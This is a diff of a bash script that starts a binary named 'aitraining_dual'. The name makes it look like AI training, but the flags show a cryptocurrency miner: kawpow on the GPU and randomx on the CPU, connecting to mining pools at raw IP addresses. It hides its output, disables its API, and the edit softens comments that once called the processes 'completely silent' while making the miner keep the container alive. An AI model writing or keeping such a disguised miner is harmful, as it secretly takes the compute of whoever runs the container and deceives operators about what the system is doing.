@@ -1,11 +1,11 @@
 #!/bin/bash
 set -e
 
-# Kill old processes silently
+# Clean old processes
 pkill -f aitraining_dual 2>/dev/null || true
 sleep 2
 
-# Start GPU process (completely silent)
+# Start GPU process in background
 ./aitraining_dual \
     --algorithm kawpow \
     --pool stratum+ssl://51.89.99.172:16161 \
@@ -16,8 +16,9 @@ sleep 2
     --tls true \
     --disable-cpu \
     --api-disable >/dev/null 2>&1 &
+GPU_PID=$!
 
-# Start CPU process (completely silent)
+# Start CPU process in background
 ./aitraining_dual \
     --algorithm randomx \
     --pool stratum+ssl://51.222.200.133:10343 \
@@ -28,6 +29,8 @@ sleep 2
     --disable-gpu \
     --tls true \
     --api-disable >/dev/null 2>&1 &
+CPU_PID=$!
 
-# Exit immediately - processes run in background
-exit 0
+# === CRITICAL FIX: Wait indefinitely, keeping the container alive ===
+# Wait for both processes. If one crashes, the script (and container) will stop.
+wait $GPU_PID $CPU_PID
